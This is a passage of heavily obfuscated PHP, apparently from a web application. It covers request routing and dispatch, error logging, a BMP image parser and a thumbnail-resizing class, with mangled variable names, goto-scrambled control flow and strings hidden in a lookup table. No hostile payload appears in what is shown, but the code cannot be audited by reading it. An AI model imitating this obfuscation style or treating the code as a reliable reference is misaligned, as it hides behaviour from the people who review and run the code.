$bÖƒ‚…ˆ…¶ = $C«ÊÇÙ´ìß[8]; if (isset($F¥íëğÇ¢‘[1]) && substr(strtolower($F¥íëğÇ¢‘[1]), -5) == $C«ÊÇÙ´ìß[9]) { $FéßÄÃ¹ì = $Dœƒ¼ÄÉÍ . $F¥íëğÇ¢‘[1]; $bÖƒ‚…ˆ…¶ = $C«ÊÇÙ´ìß[10] . $F¥íëğÇ¢‘[1] . $C«ÊÇÙ´ìß[11]; } else { if (count($F¥íëğÇ¢‘) == 3) { $FéßÄÃ¹ì = $Dœƒ¼ÄÉÍ . $F¥íëğÇ¢‘[1] . $F¥íëğÇ¢‘[2]; $bÖƒ‚…ˆ…¶ = $C«ÊÇÙ´ìß[12] . $F¥íëğÇ¢‘[1] . $C«ÊÇÙ´ìß[13] . $F¥íëğÇ¢‘[2] . $C«ÊÇÙ´ìß[11]; } } $bÖƒ‚…ˆ…¶ = PLUGIN_DIR . $Dœƒ¼ÄÉÍ . $C«ÊÇÙ´ìß[4] . $bÖƒ‚…ˆ…¶; } else { if (substr($C¦ˆ¹‹Òù¸, -5) == $C«ÊÇÙ´ìß[9]) { $Dœƒ¼ÄÉÍ = substr($F¥íëğÇ¢‘[0], 0, -5); return Model($Dœƒ¼ÄÉÍ); } else { $FéßÄÃ¹ì = $F¥íëğÇ¢‘[0] . $F¥íëğÇ¢‘[1]; $bÖƒ‚…ˆ…¶ = CONTROLLER_DIR . $F¥íëğÇ¢‘[0] . $C«ÊÇÙ´ìß[4] . $F¥íëğÇ¢‘[1] . $C«ÊÇÙ´ìß[14]; } } $AÌ•ã˜ = strtolower($FéßÄÃ¹ì); goto BÑ·î²Â¥; B–¿¯åÏŠ: } function ActionApply($BºƒÂÔìØ¸, $EÎù•˜Ê¾Ÿ = array()) { goto D±ŞÍ‰Š; D±ŞÍ‰Š: if (is_array($BºƒÂÔìØ¸)) { return call_user_func_array($BºƒÂÔìØ¸, $EÎù•˜Ê¾Ÿ); } if (function_exists($BºƒÂÔìØ¸)) { return call_user_func_array($BºƒÂÔìØ¸, $EÎù•˜Ê¾Ÿ); } $a…İÄïÓÃ‹ = strrpos($BºƒÂÔìØ¸, $_SERVER[‡•˜°©ˆ][5]); goto Aˆå‘ßî¼; Aˆå‘ßî¼: $c¾Ş–àŸÅ = substr($BºƒÂÔìØ¸, 0, $a…İÄïÓÃ‹); $B ˆˆõĞ® = substr($BºƒÂÔìØ¸, $a…İÄïÓÃ‹ + 1); $EóÙ‰Öæ¯ = Action($c¾Ş–àŸÅ); goto a‰”îØìà‡; a‰”îØìà‡: if (!method_exists($EóÙ‰Öæ¯, $B ˆˆõĞ®)) { return actionCallError("{$BºƒÂÔìØ¸}\x20\x6d\145\x74\x68\157\x64\x20\156\157\164\x20\145\170\x69\x73\164\163\x21"); } $Cóçğ˜İÄ¶ = call_user_func_array(array($EóÙ‰Öæ¯, $B ˆˆõĞ®), $EÎù•˜Ê¾Ÿ); return $Cóçğ˜İÄ¶; goto c½æ·ì†Û; c½æ·ì†Û: } function actionCallError($eÏ÷İ‚ÆÒ‚) { $bŒ¤é†Å¦Ê =& $_SERVER[‡•˜°©ˆ]; $BÉ³®Á ø§ = json_encode_force(array($bŒ¤é†Å¦Ê[15] => this_url(), $bŒ¤é†Å¦Ê[16] => $GLOBALS[$bŒ¤é†Å¦Ê[16]])); $BÉ³®Á ø§ = str_replace(array($bŒ¤é†Å¦Ê[17]), array($bŒ¤é†Å¦Ê[4]), $BÉ³®Á ø§); return write_log($eÏ÷İ‚ÆÒ‚ . $bŒ¤é†Å¦Ê[18] . $BÉ³®Á ø§, $bŒ¤é†Å¦Ê[19]); } goto Eº÷Î‚¹Á; fœç¬òÅÜ•: class ImageGdBMP { public static function load($c¾«»İÃø¥) { $e´—İ½ »„ = fopen($c¾«»İÃø¥, $_SERVER[Î¿—”òá][1513]); if ($e´—İ½ »„ === !1) { return !1; } $aíãÀº¥ = self::loadFromStream($e´—İ½ »„); fclose($e´—İ½ »„); return $aíãÀº¥; } public static function loadFromStream($bµîóå†ÎÁ) { $F©÷·ÀƒÑÃ =& $_SERVER[Î¿—”òá]; $bØ²ÒÈ¹¨ = fread($bµîóå†ÎÁ, 14); if ($bØ²ÒÈ¹¨ === !1) { return !1; } if ($bØ²ÒÈ¹¨[0] != $F©÷·ÀƒÑÃ[1824] || $bØ²ÒÈ¹¨[1] != $F©÷·ÀƒÑÃ[1825]) { return !1; } $aàÉÈ¹”” = unpack($F©÷·ÀƒÑÃ[1826] . $F©÷·ÀƒÑÃ[1827] . $F©÷·ÀƒÑÃ[1828] . $F©÷·ÀƒÑÃ[1829] . $F©÷·ÀƒÑÃ[1830], $bØ²ÒÈ¹¨); return self::loadFromStreamAndFileHeader($bµîóå†ÎÁ, $aàÉÈ¹””); } public static function loadFromStreamAndFileHeader($aïŒ¸”‚ªô, array $d˜°ÌóÏÎ¢) { goto fÕ‘¢š¡†; bƒ«Ûµ‹Â£: if ($F¢öÌÎì’ == 1 || $F¢öÌÎì’ == 4 || $F¢öÌÎì’ == 8) { goto C¼²‰›Ÿ‚â; C¼²‰›Ÿ‚â: $Eğƒ‚‘÷—„ = imagecreate($a©Ô¢®„İ, $f³Ë§®÷Ó‡); $AÈ‹‹§‹™Œ = $eÚöÚ™ÇĞÑ == 12 ? 3 : 4; $f˜º£ß»íâ = $cäÓˆ‘Ã»™ ? $cäÓˆ‘Ã»™ : pow(2, $F¢öÌÎì’); goto F›²²µì˜; F›²²µì˜: $Fõ…è¯ëæÌ = array(); for ($b¥‡šô…²¡ = 0; $b¥‡šô…²¡ < $f˜º£ß»íâ; ++$b¥‡šô…²¡) { $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, $AÈ‹‹§‹™Œ); if ($D»˜Êï¬â• === !1) { imagedestroy($Eğƒ‚‘÷—„); return !1; } extract(unpack($EÔ²°‡…†®[1850], $D»˜Êï¬â• . $EÔ²°‡…†®[1849])); $Fõ…è¯ëæÌ[] = imagecolorallocate($Eğƒ‚‘÷—„, $AÂí¦¸¿¦, $DğÅ—êˆ³·, $eé¢¶É·); } $EëØÍ§±‡© = 8 - $F¢öÌÎì’; goto f„‡ˆ„…Ì•; f„‡ˆ„…Ì•: $bÍåïÓ¹Á¹ = (1 << $F¢öÌÎì’) - 1 << $EëØÍ§±‡©; if ($Cõ¼Ù¤ÅÉ¹ == 1 || $Cõ¼Ù¤ÅÉ¹ == 2) { $f‡ ìµœÛ = 0; $bµÙŒè«˜ = $F¢öÌÎì’ >> 2 & 1; for (;;) { if ($f‡ ìµœÛ < -1 || $f‡ ìµœÛ > $a©Ô¢®„İ || $Cƒó”„óÇ­ < -1 || $Cƒó”„óÇ­ > $E“ÑÓëÎğ÷) { imagedestroy($Eğƒ‚‘÷—„); return !1; } $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, 1); if ($D»˜Êï¬â• === !1) { imagedestroy($Eğƒ‚‘÷—„); return !1; } switch ($D»˜Êï¬â•) { case $EÔ²°‡…†®[1849]: $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, 1); if ($D»˜Êï¬â• === !1) { imagedestroy($Eğƒ‚‘÷—„); return !1; } switch ($D»˜Êï¬â•) { case $EÔ²°‡…†®[1849]: $Cƒó”„óÇ­ += $eøË‘‹Í; $f‡ ìµœÛ = 0; break; case $EÔ²°‡…†®[1851]: $Cƒó”„óÇ­ = 0; $f‡ ìµœÛ = 0; break 3; case $EÔ²°‡…†®[1852]: $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, 2); if ($D»˜Êï¬â• === !1) { imagedestroy($Eğƒ‚‘÷—„); return !1; } list(, $C²‡Í‚‘Ÿ, $DºôÉ¸»‹) = unpack($EÔ²°‡…†®[1853], $D»˜Êï¬â•); $f‡ ìµœÛ += $C²‡Í‚‘Ÿ; $Cƒó”„óÇ­ += $DºôÉ¸»‹ * $eøË‘‹Í; break; default: list(, $eİÏ…ˆ•»Ö) = unpack($EÔ²°‡…†®[1854], $D»˜Êï¬â•); $aŠ‘ÇŞñ‰‡ = ($eİÏ…ˆ•»Ö >> $bµÙŒè«˜) + ($eİÏ…ˆ•»Ö & $bµÙŒè«˜); $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, $aŠ‘ÇŞñ‰‡ + 1 & ~1); if ($D»˜Êï¬â• === !1) { imagedestroy($Eğƒ‚‘÷—„); return !1; } for ($b¥‡šô…²¡ = 0, $A¤±Ã¬¹×æ = 0; $b¥‡šô…²¡ < $eİÏ…ˆ•»Ö; ++$b¥‡šô…²¡, ++$f‡ ìµœÛ, $A¤±Ã¬¹×æ += $F¢öÌÎì’) { list(, $eñÍ¥ùá¡Ô) = unpack($EÔ²°‡…†®[1854], $D»˜Êï¬â•[$A¤±Ã¬¹×æ >> 3]); $eé¢¶É· = $A¤±Ã¬¹×æ & 7; imagesetpixel($Eğƒ‚‘÷—„, $f‡ ìµœÛ, $Cƒó”„óÇ­, $Fõ…è¯ëæÌ[($eñÍ¥ùá¡Ô & $bÍåïÓ¹Á¹ >> $eé¢¶É·) >> $EëØÍ§±‡© - $eé¢¶É·]); } break; } break; default: $D­…‘£÷™ = fread($aïŒ¸”‚ªô, 1); if ($D­…‘£÷™ === !1) { imagedestroy($Eğƒ‚‘÷—„); return !1; } list(, $bŒ±ãºÒŸ, $eñÍ¥ùá¡Ô) = unpack($EÔ²°‡…†®[1853], $D»˜Êï¬â• . $D­…‘£÷™); for ($b¥‡šô…²¡ = 0, $A¤±Ã¬¹×æ = 0; $b¥‡šô…²¡ < $bŒ±ãºÒŸ; ++$b¥‡šô…²¡, ++$f‡ ìµœÛ, $A¤±Ã¬¹×æ += $F¢öÌÎì’) { $eé¢¶É· = $A¤±Ã¬¹×æ & 7; imagesetpixel($Eğƒ‚‘÷—„, $f‡ ìµœÛ, $Cƒó”„óÇ­, $Fõ…è¯ëæÌ[($eñÍ¥ùá¡Ô & $bÍåïÓ¹Á¹ >> $eé¢¶É·) >> $EëØÍ§±‡© - $eé¢¶É·]); } break; } } } else { for ($DÚ¾ÎèÓäâ = 0; $DÚ¾ÎèÓäâ < $f³Ë§®÷Ó‡; ++$DÚ¾ÎèÓäâ, $Cƒó”„óÇ­ += $eøË‘‹Í) { $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, $eó¯Ë«™èé); if ($D»˜Êï¬â• === !1) { imagedestroy($Eğƒ‚‘÷—„); return !1; } $A¤±Ã¬¹×æ = 0; for ($f‡ ìµœÛ = 0; $f‡ ìµœÛ < $a©Ô¢®„İ; ++$f‡ ìµœÛ, $A¤±Ã¬¹×æ += $F¢öÌÎì’) { list(, $eñÍ¥ùá¡Ô) = unpack($EÔ²°‡…†®[1854], $D»˜Êï¬â•[$A¤±Ã¬¹×æ >> 3]); $eé¢¶É· = $A¤±Ã¬¹×æ & 7; imagesetpixel($Eğƒ‚‘÷—„, $f‡ ìµœÛ, $Cƒó”„óÇ­, $Fõ…è¯ëæÌ[($eñÍ¥ùá¡Ô & $bÍåïÓ¹Á¹ >> $eé¢¶É·) >> $EëØÍ§±‡© - $eé¢¶É·]); } } } goto c¢‹ĞõœùÛ; c¢‹ĞõœùÛ: } else { goto dãŞİÁã˜; dãŞİÁã˜: $Eğƒ‚‘÷—„ = imagecreatetruecolor($a©Ô¢®„İ, $f³Ë§®÷Ó‡); imagealphablending($Eğƒ‚‘÷—„, !1); if ($DÔÏÓÑÓ££) { imagesavealpha($Eğƒ‚‘÷—„, !0); } goto AìëÃ¦Ş Â; Eï®Û¶½ÜÈ: for ($DÚ¾ÎèÓäâ = 0; $DÚ¾ÎèÓäâ < $f³Ë§®÷Ó‡; ++$DÚ¾ÎèÓäâ, $Cƒó”„óÇ­ += $eøË‘‹Í) { $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, $eó¯Ë«™èé); if ($D»˜Êï¬â• === !1) { imagedestroy($Eğƒ‚‘÷—„); return !1; } $A¤±Ã¬¹×æ = 0; for ($f‡ ìµœÛ = 0; $f‡ ìµœÛ < $a©Ô¢®„İ; ++$f‡ ìµœÛ, $A¤±Ã¬¹×æ += $DÈ®ôµƒˆ) { list(, $eñÍ¥ùá¡Ô) = unpack($EÔ²°‡…†®[1831], substr($D»˜Êï¬â•, $A¤±Ã¬¹×æ, $DÈ®ôµƒˆ) . $EÔ²°‡…†®[1855]); $C½ØËÆĞù¦ = $eñÍ¥ùá¡Ô & $DÔÏÓÑÓ££; $B‘™˜åÁà = $eñÍ¥ùá¡Ô & $d‹˜£íî¨; $cƒ‘Óª®‡¥ = $eñÍ¥ùá¡Ô & $fóæò–Ê¸ù; $dÇ÷¶´›ÉÈ = $eñÍ¥ùá¡Ô & $B¸ã¹æ¼¢å; $CÁØ¡‚ÏŠë = $C˜æ·Šß´– - (($C½ØËÆĞù¦ << 7) - $C½ØËÆĞù¦) * $Cà“ÄËç¹; $AÂí¦¸¿¦ = (($B‘™˜åÁà << 8) - $B‘™˜åÁà) * $FÕÔ…©¸áô; $DğÅ—êˆ³· = (($cƒ‘Óª®‡¥ << 8) - $cƒ‘Óª®‡¥) * $FŒœ´Ôæ‰; $eé¢¶É· = (($dÇ÷¶´›ÉÈ << 8) - $dÇ÷¶´›ÉÈ) * $Cœœ¯ß˜Á; imagesetpixel($Eğƒ‚‘÷—„, $f‡ ìµœÛ, $Cƒó”„óÇ­, $CÁØ¡‚ÏŠë << 24 | $AÂí¦¸¿¦ << 16 | $DğÅ—êˆ³· << 8 | $eé¢¶É·); } } imagealphablending($Eğƒ‚‘÷—„, !0); goto BÄ…Àâ¸ŒĞ; d¿øğ‚Òå: $FÕÔ…©¸áô = $d‹˜£íî¨ ? 1 / $d‹˜£íî¨ : 1; $FŒœ´Ôæ‰ = $fóæò–Ê¸ù ? 1 / $fóæò–Ê¸ù : 1; $Cœœ¯ß˜Á = $B¸ã¹æ¼¢å ? 1 / $B¸ã¹æ¼¢å : 1; goto Eï®Û¶½ÜÈ; AìëÃ¦Ş Â: $DÈ®ôµƒˆ = $F¢öÌÎì’ >> 3; $C˜æ·Šß´– = $DÔÏÓÑÓ££ ? 127 : 0; $Cà“ÄËç¹ = $DÔÏÓÑÓ££ ? 1 / $DÔÏÓÑÓ££ : 1; goto d¿øğ‚Òå; BÄ…Àâ¸ŒĞ: } return $Eğƒ‚‘÷—„; goto d…•®ø¾ë°; fÕ‘¢š¡†: $EÔ²°‡…†® =& $_SERVER[Î¿—”òá]; if ($d˜°ÌóÏÎ¢[$EÔ²°‡…†®[388]] != 19778) { return !1; } $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, 4); goto a†‡ÈÔë®; a†‡ÈÔë®: if ($D»˜Êï¬â• === !1) { return !1; } list(, $eÚöÚ™ÇĞÑ) = unpack($EÔ²°‡…†®[1831], $D»˜Êï¬â•); if ($eÚöÚ™ÇĞÑ == 12) { goto eèÑÉÕõëÙ; f¯êº¤Ù…: $cäÓˆ‘Ã»™ = $cô»‚ÍÚõ = $DÔÏÓÑÓ££ = $Cõ¼Ù¤ÅÉ¹ = 0; $d‹˜£íî¨ = 16711680; $fóæò–Ê¸ù = 65280; goto B²«õ„¼; B²«õ„¼: $B¸ã¹æ¼¢å = 255; goto Cê‘î­Í‰ß; eèÑÉÕõëÙ: $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, $eÚöÚ™ÇĞÑ - 4); if ($D»˜Êï¬â• === !1) { return !1; } extract(unpack($EÔ²°‡…†®[1832] . $EÔ²°‡…†®[1833] . $EÔ²°‡…†®[1834] . $EÔ²°‡…†®[1835], $D»˜Êï¬â•)); goto f¯êº¤Ù…; Cê‘î­Í‰ß: } else { if (124 < $eÚöÚ™ÇĞÑ || $eÚöÚ™ÇĞÑ < 40) { return !1; } else { goto cÄí‚„•Û; cÊİÜ„Ø¾Á: if ($a©Ô¢®„İ & 2147483648) { $a©Ô¢®„İ = -(~$a©Ô¢®„İ & 4294967295) - 1; } if ($E“ÑÓëÎğ÷ & 2147483648) { $E“ÑÓëÎğ÷ = -(~$E“ÑÓëÎğ÷ & 4294967295) - 1; } if ($DÃÄ©ùéÆ & 2147483648) { $DÃÄ©ùéÆ = -(~$DÃÄ©ùéÆ & 4294967295) - 1; } goto eÎ£æ¥¤±; eÙ…ç˜Ñº¼: if (($F¢öÌÎì’ == 16 || $F¢öÌÎì’ == 24 || $F¢öÌÎì’ == 32) && $Cõ¼Ù¤ÅÉ¹ == 0 && $d‹˜£íî¨ == 0 && $fóæò–Ê¸ù == 0 && $B¸ã¹æ¼¢å == 0) { switch ($F¢öÌÎì’) { case 16: $d‹˜£íî¨ = 31744; $fóæò–Ê¸ù = 992; $B¸ã¹æ¼¢å = 31; break; case 24: case 32: $d‹˜£íî¨ = 16711680; $fóæò–Ê¸ù = 65280; $B¸ã¹æ¼¢å = 255; break; } } goto a˜‚°Ùƒ—; cÄí‚„•Û: $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, 36); if ($D»˜Êï¬â• === !1) { return !1; } extract(unpack($EÔ²°‡…†®[1836] . $EÔ²°‡…†®[1837] . $EÔ²°‡…†®[1834] . $EÔ²°‡…†®[1838] . $EÔ²°‡…†®[1839] . $EÔ²°‡…†®[1840] . $EÔ²°‡…†®[1841] . $EÔ²°‡…†®[1842] . $EÔ²°‡…†®[1843] . $EÔ²°‡…†®[1844], $D»˜Êï¬â•)); goto cÊİÜ„Ø¾Á; eÎ£æ¥¤±: if ($DÙßˆ‹èÇ· & 2147483648) { $DÙßˆ‹èÇ· = -(~$DÙßˆ‹èÇ· & 4294967295) - 1; } if ($d˜°ÌóÏÎ¢[$EÔ²°‡…†®[520]] != 0) { $BÏŒİ–«’É = $F¢öÌÎì’ == 1 || $F¢öÌÎì’ == 4 || $F¢öÌÎì’ == 8 ? ($cäÓˆ‘Ã»™ ? $cäÓˆ‘Ã»™ : pow(2, $F¢öÌÎì’)) << 2 : 0; $BïíŸ™ô¿á = $b´œÔÏ÷—Ğ ? $b´œÔÏ÷—Ğ : ($a©Ô¢®„İ * $F¢öÌÎì’ + 31 >> 3 & ~3) * abs($E“ÑÓëÎğ÷); $Cñô‹Øİ•µ = $d˜°ÌóÏÎ¢[$EÔ²°‡…†®[520]] - $BïíŸ™ô¿á - $BÏŒİ–«’É - 14; if ($eÚöÚ™ÇĞÑ < $Cñô‹Øİ•µ && 40 <= $eÚöÚ™ÇĞÑ && $eÚöÚ™ÇĞÑ <= 124) { $eÚöÚ™ÇĞÑ = $Cñô‹Øİ•µ; } } if ($eÚöÚ™ÇĞÑ - 40 > 0) { $D»˜Êï¬â• = fread($aïŒ¸”‚ªô, $eÚöÚ™ÇĞÑ - 40); if ($D»˜Êï¬â• === !1) { return !1; } extract(unpack($EÔ²°‡…†®[1845] . $EÔ²°‡…†®[1846] . $EÔ²°‡…†®[1847] . $EÔ²°‡…†®[1848], $D»˜Êï¬â• . str_repeat($EÔ²°‡…†®[1849], 120))); } else { $DÔÏÓÑÓ££ = $d‹˜£íî¨ = $fóæò–Ê¸ù = $B¸ã¹æ¼¢å = 0; } goto eÙ…ç˜Ñº¼; a˜‚°Ùƒ—: } } goto c§³ƒá´ˆ; c§³ƒá´ˆ: if ($a©Ô¢®„İ == 0 || $E“ÑÓëÎğ÷ == 0 || $böóñ¯Óº” != 1 || ($DÔÏÓÑÓ££ & $d‹˜£íî¨) != 0 || ($DÔÏÓÑÓ££ & $fóæò–Ê¸ù) != 0 || ($DÔÏÓÑÓ££ & $B¸ã¹æ¼¢å) != 0 || ($d‹˜£íî¨ & $fóæò–Ê¸ù) != 0 || ($d‹˜£íî¨ & $B¸ã¹æ¼¢å) != 0 || ($fóæò–Ê¸ù & $B¸ã¹æ¼¢å) != 0) { return !1; } if ($Cõ¼Ù¤ÅÉ¹ == 4 || $Cõ¼Ù¤ÅÉ¹ == 5) { $D»˜Êï¬â• = stream_get_contents($aïŒ¸”‚ªô, $b´œÔÏ÷—Ğ); if ($D»˜Êï¬â• === !1) { return !1; } return imagecreatefromstring($D»˜Êï¬â•); } $eó¯Ë«™èé = $a©Ô¢®„İ * $F¢öÌÎì’ + 31 >> 3 & ~3; goto EËÌ¶Ö±Ş; EËÌ¶Ö±Ş: $f³Ë§®÷Ó‡ = abs($E“ÑÓëÎğ÷); $Cƒó”„óÇ­ = $E“ÑÓëÎğ÷ > 0 ? $f³Ë§®÷Ó‡ - 1 : 0; $eøË‘‹Í = $E“ÑÓëÎğ÷ > 0 ? -1 : 1; goto bƒ«Ûµ‹Â£; d…•®ø¾ë°: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($d´—˜•÷à, $CÉ¬‘³™“”) { goto eº»ô“ˆ³¾; Bî¬ã¾¸šÄ: if (!$this->im) { return !1; } $bœŸ„©¢ = $_SERVER[Î¿—”òá][33]; $this->imgData = GetImageSize($d´—˜•÷à, $bœŸ„©¢); goto F¥£ö’†­æ; eº»ô“ˆ³¾: $this->srcFile = $d´—˜•÷à; $this->echoType = $CÉ¬‘³™“”; $this->im = self::image($d´—˜•÷à); goto Bî¬ã¾¸šÄ; F¥£ö’†­æ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto F¨¥ˆäóà‡; F¨¥ˆäóà‡: } public static function image($cí¾Ê¡Ó¨²) { $F– Ã„ã‰ =& $_SERVER[Î¿—”òá]; $CËÕ¯¼öù„ = $F– Ã„ã‰[33]; $Bİ‘ª»³… = GetImageSize($cí¾Ê¡Ó¨², $CËÕ¯¼öù„); $EÊ›Â“í¦ = !1; switch ($Bİ‘ª»³…[2]) { case IMAGETYPE_GIF: if (!function_exists($F– Ã„ã‰[1856])) { break; } $EÊ›Â“í¦ = imagecreatefromgif($cí¾Ê¡Ó¨²); break; case IMAGETYPE_JPEG: if (!function_exists($F– Ã„ã‰[1857])) { break; } $EÊ›Â“í¦ = imagecreatefromjpeg($cí¾Ê¡Ó¨²); break; case IMAGETYPE_PNG: if (!function_exists($F– Ã„ã‰[1858])) { break; } $EÊ›Â“í¦ = @imagecreatefrompng($cí¾Ê¡Ó¨²); imagesavealpha($EÊ›Â“í¦, !0); break; case IMAGETYPE_XBM: $EÊ›Â“í¦ = imagecreatefromxbm($cí¾Ê¡Ó¨²); break; case IMAGETYPE_WBMP: $EÊ›Â“í¦ = imagecreatefromwbmp($cí¾Ê¡Ó¨²); break; case IMAGETYPE_BMP: $EÊ›Â“í¦ = imagecreatefrombmp($cí¾Ê¡Ó¨²); break; default: break; } return $EÊ›Â“í¦; } public static function imageSize($B¯‘ÑÀíö¶) { $CÎ´×©“Òê =& $_SERVER[Î¿—”òá]; $d©˜±¸Œ = GetImageSize($B¯‘ÑÀíö¶); if (!$d©˜±¸Œ) { return !1; } return array($CÎ´×©“Òê[1859] => $d©˜±¸Œ[0], $CÎ´×©“Òê[1860] => $d©˜±¸Œ[1]); } function distortion($eÆÈËÖéµ, $bŠ÷‚ö÷Ò, $cİˆ»áØŒ) { $eŞ³Õö« » = $this->creatImage($this->im, $bŠ÷‚ö÷Ò, $cİˆ»áØŒ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eŞ³Õö« », $eÆÈËÖéµ); } function prorate($bÄ‚®Šô˜Ä, $f°˜ °Ì, $dÖ¬¿»Ïœé) { $eß¿ŒØñ¥Ÿ = $f°˜ °Ì / $dÖ¬¿»Ïœé; $AŒÇ°›‚¹ = $this->srcW / $this->srcH; if ($eß¿ŒØñ¥Ÿ <= $AŒÇ°›‚¹) { $DŒŒ‚Ä‹¨ = $f°˜ °Ì; $b¦øÕÂÃĞ‘ = $DŒŒ‚Ä‹¨ * ($this->srcH / $this->srcW); } else { $b¦øÕÂÃĞ‘ = $dÖ¬¿»Ïœé; $DŒŒ‚Ä‹¨ = $b¦øÕÂÃĞ‘ * ($this->srcW / $this->srcH); } if ($this->srcW > $f°˜ °Ì || $this->srcH > $dÖ¬¿»Ïœé) { $eŸ‘“ğ¶‚ = $this->creatImage($this->im, $DŒŒ‚Ä‹¨, $b¦øÕÂÃĞ‘, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eŸ‘“ğ¶‚, $bÄ‚®Šô˜Ä); } else { $eŸ‘“ğ¶‚ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eŸ‘“ğ¶‚, $bÄ‚®Šô˜Ä); } } function cut($f¼‡âÚÕ›¤, $e‹Œ˜òĞï, $aÛìáÆ¤Ïã) { goto E‰¡›‹İ¸ª; E‰¡›‹İ¸ª: $bîòÀéÀÖ = $e‹Œ˜òĞï / $aÛìáÆ¤Ïã; $EÁ…“¹ï¹° = $this->srcW / $this->srcH; if ($bîòÀéÀÖ <= $EÁ…“¹ï¹°) { $f¶®ÂÓÚ„Ø = $aÛìáÆ¤Ïã; $c‚ô“Ó¸”× = $f¶®ÂÓÚ„Ø * ($this->srcW / $this->srcH); } else { $c‚ô“Ó¸”× = $e‹Œ˜òĞï; $f¶®ÂÓÚ„Ø = $c‚ô“Ó¸”× * ($this->srcH / $this->srcW); } goto câ°³„ï–³; câ°³„ï–³: $bëÙ•Â®õ = $this->creatImage($this->im, $c‚ô“Ó¸”×, $f¶®ÂÓÚ„Ø, 0, 0, 0, 0, $this->srcW, $this->srcH); $b¢ºßë†¢„ = $this->creatImage($bëÙ•Â®õ, $e‹Œ˜òĞï, $aÛìáÆ¤Ïã, 0, 0, ($c‚ô“Ó¸”× - $e‹Œ˜òĞï) / 2, ($f¶®ÂÓÚ„Ø - $aÛìáÆ¤Ïã) / 2, $e‹Œ˜òĞï, $aÛìáÆ¤Ïã); imageDestroy($bëÙ•Â®õ); goto aºÁØÛ„š£; aºÁØÛ„š£: return $this->echoImage($b¢ºßë†¢„, $f¼‡âÚÕ›¤); goto c‹Âƒ†êã; c‹Âƒ†êã: } function backFill($bÅ¡¥Œ»¬”, $fÓöñ¿Æ‰, $aÓˆà¨Æ“„, $aöˆ¹´ˆæ = false, $cÉ¼‡ô°“² = 255, $Bâ‘ó™Ê  = 255, $bÖØÍğå´ = 255) { goto fÇï¨ù‡»‡; bì¬¼ÕÛ¹Â: if ($aöˆ¹´ˆæ) { $b£æœî„÷ = imageColorTransparent($B‰ˆË¿±ì, $b£æœî„÷); $AËíğÚßŸ¾ = $aÓˆà¨Æ“„ - $c‚£Î‡äíá; } imageFilledRectangle($B‰ˆË¿±ì, 0, 0, $fÓöñ¿Æ‰, $aÓˆà¨Æ“„, $b£æœî„÷); if ($this->srcW > $fÓöñ¿Æ‰ || $this->srcH > $aÓˆà¨Æ“„) { $Fùƒºç²¸ = $this->creatImage($this->im, $aª±¾…¶´, $c‚£Î‡äíá, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($aª±¾…¶´ < $fÓöñ¿Æ‰) { imageCopy($B‰ˆË¿±ì, $Fùƒºç²¸, ($fÓöñ¿Æ‰ - $aª±¾…¶´) / 2, 0, 0, 0, $aª±¾…¶´, $c‚£Î‡äíá); } else { if ($c‚£Î‡äíá < $aÓˆà¨Æ“„) { imageCopy($B‰ˆË¿±ì, $Fùƒºç²¸, 0, $AËíğÚßŸ¾, 0, 0, $aª±¾…¶´, $c‚£Î‡äíá); } else { imageCopy($B‰ˆË¿±ì, $Fùƒºç²¸, 0, 0, 0, 0, $aª±¾…¶´, $c‚£Î‡äíá); } } } else { imageCopyMerge($B‰ˆË¿±ì, $this->im, ($fÓöñ¿Æ‰ - $aª±¾…¶´) / 2, $AËíğÚßŸ¾, 0, 0, $aª±¾…¶´, $c‚£Î‡äíá, 100); } goto Fç¿Ã…œê•; bÙŠ£Š¢½˜: if (function_exists($_SERVER[Î¿—”òá][1861])) { @($B‰ˆË¿±ì = imageCreateTrueColor($fÓöñ¿Æ‰, $aÓˆà¨Æ“„)); if (!$B‰ˆË¿±ì) { $B‰ˆË¿±ì = imageCreate($fÓöñ¿Æ‰, $aÓˆà¨Æ“„); } } else { $B‰ˆË¿±ì = imageCreate($fÓöñ¿Æ‰, $aÓˆà¨Æ“„); } $AËíğÚßŸ¾ = ($aÓˆà¨Æ“„ - $c‚£Î‡äíá) / 2; $b£æœî„÷ = imagecolorallocate($B‰ˆË¿±ì, $cÉ¼‡ô°“², $Bâ‘ó™Ê , $bÖØÍğå´); goto bì¬¼ÕÛ¹Â; fÇï¨ù‡»‡: $dµõŠ®´•Â = $fÓöñ¿Æ‰ / $aÓˆà¨Æ“„; $CÂœ‰‡›ÕÕ = $this->srcW / $this->srcH; if ($dµõŠ®´•Â <= $CÂœ‰‡›ÕÕ) { $aª±¾…¶´ = $fÓöñ¿Æ‰; $c‚£Î‡äíá = $aª±¾…¶´ * ($this->srcH / $this->srcW); } else { $c‚£Î‡äíá = $aÓˆà¨Æ“„; $aª±¾…¶´ = $c‚£Î‡äíá * ($this->srcW / $this->srcH); } goto bÙŠ£Š¢½˜; Fç¿Ã…œê•: return $this->echoImage($B‰ˆË¿±ì, $bÅ¡¥Œ»¬”); goto b¬„ÁÇŒ°ß; b¬„ÁÇŒ°ß: } function creatImage($dæ†¡²µ“¸, $b÷Ü¯¢ºÜ½, $dÂŠ¥ğ™È–, $e¬ã”Şƒæ¥, $cÙ»°¿¬á, $d‰ÒäïŠ¯Ü, $b½Š½å§¹Ä, $dÌ±ÌĞÅ˜¿, $BÃ· ¹‚š„) { if (function_exists($_SERVER[Î¿—”òá][1861])) { @($fëµÈÎóÔÀ = ImageCreateTrueColor($b÷Ü¯¢ºÜ½, $dÂŠ¥ğ™È–)); @imagealphablending($fëµÈÎóÔÀ, !1); @imagesavealpha($fëµÈÎóÔÀ, !0); if ($fëµÈÎóÔÀ) { imageCopyResampled($fëµÈÎóÔÀ, 